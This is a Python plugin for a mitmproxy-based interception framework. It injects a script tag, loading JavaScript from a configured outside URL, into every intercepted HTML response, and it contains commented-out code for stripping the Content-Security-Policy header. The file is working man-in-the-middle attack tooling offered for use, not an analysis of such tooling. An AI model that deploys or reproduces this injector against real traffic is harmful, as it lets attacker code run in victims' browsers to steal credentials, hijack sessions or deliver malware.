from bs4 import BeautifulSoup
from mitmproxy.models import decoded
from plugins.plugin import PluginTemplate

class js_inject(PluginTemplate):
    name    = 'js_inject'
    version = '1.0'
    desc    = 'JavaScript url injection is a process by which we can insert and use our own JavaScript code in a page.'
    def __init__(self):
        self.url = self.config.get_setting('js_inject','url')

    def request(self, flow):
        pass

    def response(self,flow):
        with decoded(flow.response):  # Remove content encoding (gzip, ...)
            html = BeautifulSoup(flow.response.content)
            """
            # To Allow CORS
            if "Content-Security-Policy" in flow.response.headers:
                del flow.response.headers["Content-Security-Policy"]
            """
            if html.body:
                script = html.new_tag(
                    'script',
                    src=self.url)
                html.body.insert(0, script)
                flow.response.content = str(html)
                self.log.info("[{}]******* script Filter Injected *******".format(self.name))